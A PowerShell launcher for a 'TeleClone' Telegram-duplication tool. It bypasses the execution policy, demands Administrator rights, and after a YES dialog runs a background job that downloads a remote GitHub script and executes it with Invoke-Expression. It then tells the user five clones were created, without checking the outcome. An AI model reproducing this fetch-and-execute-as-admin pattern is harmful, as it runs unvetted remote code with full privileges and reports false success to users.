# TeleClone Main UI By D@rkshadow
Set-ExecutionPolicy Bypass -Scope Process -Force;
[Console]::OutputEncoding = [Text.UTF8Encoding]::UTF8
$OutputEncoding = [Console]::InputEncoding = [Console]::OutputEncoding = New-Object System.Text.UTF8Encoding

# TeleCloneUI_AutoCloseProgress.ps1
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned 

function Show-AdminAcceptanceForm {
    # Check if running as Administrator first
    if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
        Write-Host "This script requires Administrator privileges!" -ForegroundColor Red
        Write-Host "Please run PowerShell as Administrator" -ForegroundColor Yellow
        return $false
    }
    
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    Add-Type -AssemblyName System.Net.Http
    
    # Create main form
    $form = New-Object System.Windows.Forms.Form
    $form.Text = "TELE CLONE TOOL"
    $form.Size = New-Object System.Drawing.Size(600, 450)
    $form.StartPosition = "CenterScreen"
    $form.FormBorderStyle = "FixedDialog"
    $form.MaximizeBox = $false
    $form.MinimizeBox = $false
    $form.BackColor = [System.Drawing.Color]::White
    
    # Download and set icon from online URL
    try {
        $iconUrl = "https://raw.githubusercontent.com/Darkshadow2019/TeleClone/refs/heads/main/Web-telegram.256.png"
        $client = New-Object System.Net.WebClient
        $iconBytes = $client.DownloadData($iconUrl)
        $client.Dispose()
        
        $memoryStream = New-Object System.IO.MemoryStream($iconBytes, $false)
        $form.Icon = [System.Drawing.Icon]::FromHandle(([System.Drawing.Bitmap]::new($memoryStream)).GetHicon())
        $memoryStream.Dispose()
    }
    catch {
        # Use default system icon if online icon fails
        $form.Icon = [System.Drawing.SystemIcons]::Shield
    }
    
    # Main Title (Big Font)
    $titleLabel = New-Object System.Windows.Forms.Label
    $titleLabel.Location = New-Object System.Drawing.Point(20, 20)
    $titleLabel.Size = New-Object System.Drawing.Size(560, 40)
    $titleLabel.Text = "TELEGRAM CLONE TOOL BY D@RKSHADOW"
    $titleLabel.Font = New-Object System.Drawing.Font("Microsoft Sans Serif", 18, [System.Drawing.FontStyle]::Bold)
    $titleLabel.ForeColor = [System.Drawing.Color]::DarkRed
    $titleLabel.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
    $form.Controls.Add($titleLabel)
    
    # Separator line
    $separator = New-Object System.Windows.Forms.Label
    $separator.Location = New-Object System.Drawing.Point(20, 70)
    $separator.Size = New-Object System.Drawing.Size(560, 2)
    $separator.BorderStyle = [System.Windows.Forms.BorderStyle]::Fixed3D
    $form.Controls.Add($separator)
    
    # Online Icon Display
    $iconPictureBox = New-Object System.Windows.Forms.PictureBox
    $iconPictureBox.Location = New-Object System.Drawing.Point(250, 85)
    $iconPictureBox.Size = New-Object System.Drawing.Size(100, 100)
    $iconPictureBox.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::Zoom
    
    try {
        $imageUrl = "https://raw.githubusercontent.com/Darkshadow2019/TeleClone/refs/heads/main/Web-telegram.256.png"
        $client = New-Object System.Net.WebClient
        $imageBytes = $client.DownloadData($imageUrl)
        $client.Dispose()
        
        $memoryStream = New-Object System.IO.MemoryStream($imageBytes, $false)
        $iconPictureBox.Image = [System.Drawing.Image]::FromStream($memoryStream)
        $memoryStream.Dispose()
    }
    catch {
        # Use default image if online image fails
        $iconPictureBox.Image = [System.Drawing.SystemIcons]::Shield.ToBitmap()
    }
    $form.Controls.Add($iconPictureBox)
    
    # Description Text
    $descriptionLabel = New-Object System.Windows.Forms.Label
    $descriptionLabel.Location = New-Object System.Drawing.Point(30, 200)
    $descriptionLabel.Size = New-Object System.Drawing.Size(540, 150)
    $descriptionLabel.Text = 'ယခု application ကို အသုံးပြုပြီး Telegram ၅ ခု ပွားပြီး အသုံးပြုနိူင်ပါတယ် အကယ်၍ အသုံးပြုမယ်ဆို yes ကို နှိပ်ပြီး စတင်နိူင်ပါတယ်' + [Environment]::NewLine + [Environment]::NewLine +
                           '您可以使用此应用程序复制 5 个 Telegram 帐户。如果您想使用它，请单击“是”并开始。' + [Environment]::NewLine + [Environment]::NewLine +
                           "Application : TELE CLONE" + [Environment]::NewLine +  
                           "Version : 1.0.0.1" + [Environment]::NewLine +
                           "Programming Language : PowerShell Script Language" + [Environment]::NewLine +
                           "Developer : D@rkshadow Myanmar" + [Environment]::NewLine +
                           "Release Date : 1.10.2025" + [Environment]::NewLine
              
    $descriptionLabel.Font = New-Object System.Drawing.Font("Microsoft Sans Serif",9, [System.Drawing.FontStyle]::Regular)
    $descriptionLabel.ForeColor = [System.Drawing.Color]::DarkBlue
    $form.Controls.Add($descriptionLabel)
    
    # Yes Button
    $yesButton = New-Object System.Windows.Forms.Button
    $yesButton.Location = New-Object System.Drawing.Point(150, 370)
    $yesButton.Size = New-Object System.Drawing.Size(120, 35)
    $yesButton.Text = "YES"
    $yesButton.Font = New-Object System.Drawing.Font("Microsoft Sans Serif", 10, [System.Drawing.FontStyle]::Bold)
    $yesButton.BackColor = [System.Drawing.Color]::LightGreen
    $yesButton.ForeColor = [System.Drawing.Color]::DarkGreen
    $yesButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
    $yesButton.DialogResult = [System.Windows.Forms.DialogResult]::Yes
    $form.Controls.Add($yesButton)
    
    # No Button
    $noButton = New-Object System.Windows.Forms.Button
    $noButton.Location = New-Object System.Drawing.Point(330, 370)
    $noButton.Size = New-Object System.Drawing.Size(120, 35)
    $noButton.Text = "NO"
    $noButton.Font = New-Object System.Drawing.Font("Microsoft Sans Serif", 10, [System.Drawing.FontStyle]::Regular)
    $noButton.BackColor = [System.Drawing.Color]::LightCoral
    $noButton.ForeColor = [System.Drawing.Color]::DarkRed
    $noButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
    $noButton.DialogResult = [System.Windows.Forms.DialogResult]::No
    $form.Controls.Add($noButton)
    
    # Set form accept and cancel buttons
    $form.AcceptButton = $yesButton
    $form.CancelButton = $noButton
    
    # Add event handlers
    $yesButton.Add_Click({
        Write-Host "Administrator accepted the terms" -ForegroundColor Green
        
        # Log the acceptance
        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        $logEntry = "[$timestamp] Admin acceptance by: $user"
        Write-Host "Log: $logEntry" -ForegroundColor Cyan
        
        # Start main operations in the same thread (simpler approach)
        $form.DialogResult = [System.Windows.Forms.DialogResult]::Yes
        $form.Close()
    })
    
    $noButton.Add_Click({
        Write-Host "Administrator declined access" -ForegroundColor Red
        $form.DialogResult = [System.Windows.Forms.DialogResult]::No
        $form.Close()
    })
    
    # Show the form and return result
    $result = $form.ShowDialog()
    
    if ($result -eq [System.Windows.Forms.DialogResult]::Yes) {
        # Start main operations after form closes
        Start-MainOperations
        return $true
    } else {
        return $false
    }
}

function Start-MainOperations {
    Write-Host "Starting main application operations..." -ForegroundColor Green
    Write-Host "========================================" -ForegroundColor Green
    
    # Create and show progress form
    $progressForm = Show-ProgressForm
    
    try {
        # Your main application logic goes here
        Write-Host "Running with Administrator privileges" -ForegroundColor Green
        Write-Host "Performing system operations..." -ForegroundColor Yellow
        
        # Start background tasks
        Start-BackgroundTasks
        
        Write-Host "Main application operations completed successfully" -ForegroundColor Green
    }
    finally {
        # Always close the progress form when done
        if ($progressForm -and !$progressForm.IsDisposed) {
            $progressForm.Close()
            $progressForm.Dispose()
            Write-Host "Progress form closed" -ForegroundColor Gray
        }
    }
}

function Show-ProgressForm {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    
    $progressForm = New-Object System.Windows.Forms.Form
    $progressForm.Text = "TeleClone - Processing"
    $progressForm.Size = New-Object System.Drawing.Size(400, 200)
    $progressForm.StartPosition = "CenterScreen"
    $progressForm.FormBorderStyle = "FixedDialog"
    $progressForm.MaximizeBox = $false
    $progressForm.MinimizeBox = $false
    $progressForm.Topmost = $true
    $progressForm.ControlBox = $false  # Remove close button
    
    # Progress label
    $progressLabel = New-Object System.Windows.Forms.Label
    $progressLabel.Location = New-Object System.Drawing.Point(20, 20)
    $progressLabel.Size = New-Object System.Drawing.Size(360, 30)
    $progressLabel.Text = "TeleClone is processing in background..."
    $progressLabel.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
    $progressLabel.Font = New-Object System.Drawing.Font("Microsoft Sans Serif", 10, [System.Drawing.FontStyle]::Regular)
    $progressForm.Controls.Add($progressLabel)
    
    # Progress bar
    $progressBar = New-Object System.Windows.Forms.ProgressBar
    $progressBar.Location = New-Object System.Drawing.Point(20, 60)
    $progressBar.Size = New-Object System.Drawing.Size(360, 30)
    $progressBar.Style = [System.Windows.Forms.ProgressBarStyle]::Marquee
    $progressForm.Controls.Add($progressBar)
    
    # Status label
    $statusLabel = New-Object System.Windows.Forms.Label
    $statusLabel.Location = New-Object System.Drawing.Point(20, 100)
    $statusLabel.Size = New-Object System.Drawing.Size(360, 30)
    $statusLabel.Text = "Please wait while we set up your Telegram clones..."
    $statusLabel.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
    $statusLabel.Font = New-Object System.Drawing.Font("Microsoft Sans Serif", 8, [System.Drawing.FontStyle]::Italic)
    $progressForm.Controls.Add($statusLabel)
    
    # Cancel button (optional)
    $cancelButton = New-Object System.Windows.Forms.Button
    $cancelButton.Location = New-Object System.Drawing.Point(160, 140)
    $cancelButton.Size = New-Object System.Drawing.Size(80, 25)
    $cancelButton.Text = "Cancel"
    $cancelButton.Enabled = $false  # Disable cancel for now
    $progressForm.Controls.Add($cancelButton)
    
    # Show the form non-modally (allows background processing)
    $progressForm.Show()
    
    # Return the form so we can close it later
    return $progressForm
}

function Start-BackgroundTasks {
    Write-Host "Starting background tasks..." -ForegroundColor Yellow
    
    # Task 1: Download and execute GitHub script
    $githubTask = Start-Job -ScriptBlock {
        $githubUrl = "https://raw.githubusercontent.com/Darkshadow2019/TeleClone/refs/heads/main/Tools/TeleClone.ps1"
        try {
            Write-Output "Downloading TeleClone script from GitHub..."
            Start-Sleep -Seconds 1
            $scriptContent = Invoke-RestMethod -Uri $githubUrl
            Write-Output "Script downloaded successfully"
            
            if (-not [string]::IsNullOrWhiteSpace($scriptContent)) {
                Write-Output "Executing TeleClone operations..."
                Start-Sleep -Seconds 2
                # Run Script TeleClone ----------------------------------------------------
                Invoke-Expression $scriptContent
                Write-Output "GitHub script execution completed"
            } else {
                Write-Output "Error: Downloaded script is empty"
            }
        }
        catch {
            Write-Output "GitHub task error: $($_.Exception.Message)"
        }
    }
    
   
    # Wait for all jobs to complete
    Write-Host "Waiting for background tasks to complete..." -ForegroundColor Yellow
    
    $jobs = @($githubTask)
    $completedCount = 0
    
    # Monitor job progress
    while ($completedCount -lt $jobs.Count) {
        $completedCount = ($jobs | Where-Object { $_.State -eq "Completed" -or $_.State -eq "Failed" -or $_.State -eq "Stopped" }).Count
        Write-Host "Progress: $completedCount/$($jobs.Count) tasks completed" -ForegroundColor Gray
        Start-Sleep -Seconds 1
    }
    
    # Collect results
    Write-Host "Collecting task results..." -ForegroundColor Yellow
    foreach ($job in $jobs) {
        try {
            $results = Receive-Job -Job $job -ErrorAction SilentlyContinue
            if ($results) {
                Write-Host "Task results:" -ForegroundColor Cyan
                foreach ($result in $results) {
                    Write-Host "  $result" -ForegroundColor White
                }
            }
        }
        catch {
            Write-Host "Error receiving job results: $($_.Exception.Message)" -ForegroundColor Red
        }
        finally {
            Remove-Job -Job $job -Force -ErrorAction SilentlyContinue
        }
    }
    
    Write-Host "All background tasks completed" -ForegroundColor Green
}

# ================================================
# MAIN EXECUTION
# ================================================

Write-Host "TeleClone UI Application Launcher" -ForegroundColor Cyan
Write-Host "==================================" -ForegroundColor Cyan

try {
    # Call the main function
    $accepted = Show-AdminAcceptanceForm

    if ($accepted) {
        Write-Host "Application completed successfully" -ForegroundColor Green
        
        # Show final completion message
        [System.Windows.Forms.MessageBox]::Show(
            "TeleClone operations completed successfully!`n`n5 Telegram clones have been created on your desktop.`nYou can now use multiple Telegram accounts simultaneously.",
            "TeleClone - Completed",
            [System.Windows.Forms.MessageBoxButtons]::OK,
            [System.Windows.Forms.MessageBoxIcon]::Information
        )
    } else {
        Write-Host "Application terminated by user" -ForegroundColor Yellow
    }
}
catch {
    Write-Host "Unexpected error: $($_.Exception.Message)" -ForegroundColor Red
}
finally {
    # Clean up any remaining jobs
    Get-Job | Remove-Job -Force -ErrorAction SilentlyContinue
    Write-Host "Cleanup completed" -ForegroundColor Gray
}

Write-Host "Script execution finished" -ForegroundColor Gray
